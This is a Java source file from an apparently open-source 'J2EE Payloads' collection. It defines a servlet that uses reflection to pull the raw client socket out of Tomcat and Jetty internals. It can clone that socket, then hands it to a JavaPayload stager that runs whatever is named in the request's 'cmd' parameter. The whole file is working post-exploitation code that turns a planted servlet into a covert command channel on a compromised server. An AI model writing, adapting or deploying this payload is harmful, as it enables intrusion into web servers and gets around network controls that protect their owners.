/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.servlet;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import javapayload.stager.LocalTest;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class FindSockServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		response.setContentType("text/plain");
		boolean clone="1".equals(request.getParameter("clone"));
		boolean verbose = "1".equals(request.getParameter("verbose"));
		ServletOutputStream sout = response.getOutputStream();
		Socket sock = null;
		SocketChannel channel = null;
		// hard-coded shortcuts for common servlet containers
		try {
			if (request.getClass().getName().equals("org.apache.catalina.connector.RequestFacade") || request.getClass().getName().equals("org.apache.coyote.tomcat5.CoyoteRequestFacade")) {
				// RequestFacade: Tomcat 5.5 and 6.0 and 7.0
				// CoyoteRequestFacade: Tomcat 5.0
				sout.println("Tomcat 5/6/7 request class found, getting processor...");
				Object processor = getField(getField(getField(request, "request"), "coyoteRequest"), "hook");
				if (processor == null)
					processor = getField(getField(getField(response, "response"), "coyoteResponse"), "hook");
				if (processor.getClass().getName().equals("org.apache.coyote.http11.Http11Processor")) {
					sout.println("Tomcat processor class found, getting socket...");
					Object socket = getField(processor, "socket");
					if (!(socket instanceof Socket)) // Tomcat 7.0
						socket = getField(socket, "socket");
					sock = (Socket)socket;
				} else if (processor.getClass().getName().equals("org.apache.coyote.http11.Http11AprProcessor")) {
					sout.println("Native APR library found, socket finding will not work :-(");
					return;
				} else {
					sout.println(("Processor class: "+processor.getClass()));
				}
			} else if (request.getClass().getName().equals("org.apache.catalina.connector.HttpRequestFacade")) {
				// Tomcat 4.0
				sout.println("Tomcat 4 request class found, getting socket...");
				sock = (Socket) getField(getField(request, "request"), "socket");
			} else if (request.getClass().getName().equals("org.apache.tomcat.facade.HttpServletRequestFacade")) {
				// Tomcat 3.2
				sout.println("Tomcat 3.2 request class found, getting socket...");
				sock = (Socket) getField(getField(request, "request"), "socket");
			} else if (request.getClass().getName().equals("org.mortbay.jetty.Request")) {
				// Jetty 6.1
				sout.println("Jetty 6.1 request class found, getting socket...");
				sock = (Socket) getField(getField(request, "_endp"), "_socket");
			} else if (request.getClass().getName().equals("org.mortbay.jetty.servlet.ServletHttpRequest")) {
				// Jetty 4.2
				sout.println("Jetty 4.2 request class found, getting socket...");
				sock = (Socket) getField(getField(getField(request, "_httpRequest"), "_connection"), "_connection");
			} else {
				sout.println(("Request class: "+request.getClass()));
			}
		} catch (Exception ex) {
			sout.println("Could not find socket:");
			ex.printStackTrace(new PrintStream(sout, true));
		}
		if (sock == null) {
			sout.println("Socket not found, falling back to manual scan...");
			ArrayList scanQueue = new ArrayList();
			ArrayList done = new ArrayList();
			scanQueue.add(request);
			scanQueue.add(response);
			scanloop: while(scanQueue.size() > 0) {
				Object obj = scanQueue.remove(0);
				done.add(obj);
				List newRefs = new ArrayList();
				if (obj instanceof Object[]) {
					newRefs.addAll(Arrays.asList((Object[]) obj));
				} else {
					if (channel == null && obj instanceof SocketChannel)
						channel = (SocketChannel) obj;
					Class c = obj.getClass();
					while (c != null) {
						Field[] fs = c.getDeclaredFields();
						for (int i = 0; i < fs.length; i++) {
							Field f = fs[i];
							f.setAccessible(true);
							if (!f.getType().isPrimitive()) {
								try {
									Object value = f.get(obj);
									newRefs.add(value);
								} catch (IllegalAccessException ex) {}
							}
						}
						c = c.getSuperclass();
					}
				}
				for (int i = 0; i < newRefs.size(); i++) {
					Object value = newRefs.get(i);
					if (value == null) {
						// ignore nulls
					} else if (value instanceof Socket) {
						sock = (Socket) value;
						break scanloop;
					} else {
						boolean found = false;
						for (int j = 0; !found && j < scanQueue.size(); j++) {
							if (scanQueue.get(j) == value) {
								found = true;
							}
						}
						for (int j = 0; !found && j < done.size(); j++) {
							if (done.get(j) == value) {
								found = true;
							}
						}
						if (!found) {
							if (verbose)
								sout.println("Found: "+value.getClass()+": "+new String((""+value).replace('\1', '\2').getBytes("ISO-8859-1"), "ISO-8859-1"));
							scanQueue.add(value);
						}
					}
				}
			}
		}
		if (sock == null && channel != null) {
			sout.println("No socket found, but socket channel found, creating socket from that one instead.");
			sock = channel.socket();
		}
		if (sock == null) {
			sout.println("Socket not found :-(");
			return;
		}
		sout.println("Socket found.");
		if (sock.isInputShutdown())
			sout.println("Input has been shut down, will not be able to receive commands!");
		if (clone && sock.getClass() != Socket.class) {
			sout.println(("Socket is of subclass "+sock.getClass()+", cannot clone."));
			clone = false;
		}
		if (clone) {
			sout.println("Cloning socket...");
			Socket oldSock = sock;
			sock = new Socket();
			Field[] fields = Socket.class.getDeclaredFields();
			for (int i = 0; i < fields.length; i++) {
				fields[i].setAccessible(true);
				try {
					fields[i].set(sock, fields[i].get(oldSock));
				} catch (IllegalAccessException ex) {
					ex.printStackTrace(new PrintStream(sout));
				}
			}
			sout.println("Socket cloned.");
			sout.write(1);
			sout.flush();			
			try {
			Field impl = Socket.class.getDeclaredField("impl");
			impl.setAccessible(true);
			impl.set(oldSock, null);
			} catch (Exception ex) {
				ex.printStackTrace(new PrintStream(sock.getOutputStream()));
			}
		} else {
			sout.write(1);
			sout.flush();
		}
		sock.setSoTimeout(0);
		OutputStream out = sock.getOutputStream();
		InputStream in = sock.getInputStream();
		int b;
		while((b=in.read()) != 3) {
			if (b == -1) {
				out.write("Could not read input marker".getBytes());
				sock.close();
				return;
			}
		}
		out.write(2);
		out.flush();
		try {
			new LocalTest(in, out).bootstrap(request.getParameter("cmd").split(" "));
		} catch (Exception ex) {
			ex.printStackTrace(new PrintStream(out));
			out.flush();
		}
		sock.close();
	}
	
	private static Object getField(Object obj, String name) {
		try {
			Class c = obj.getClass();
			Field fld;
			while(true) {
				try {
					fld = c.getDeclaredField(name);
					break;
				} catch (NoSuchFieldException ex) {}
				c = c.getSuperclass();
			}
			fld.setAccessible(true);
			return fld.get(obj);
		} catch (Exception ex) {
			throw new RuntimeException(ex);
		}
	}
}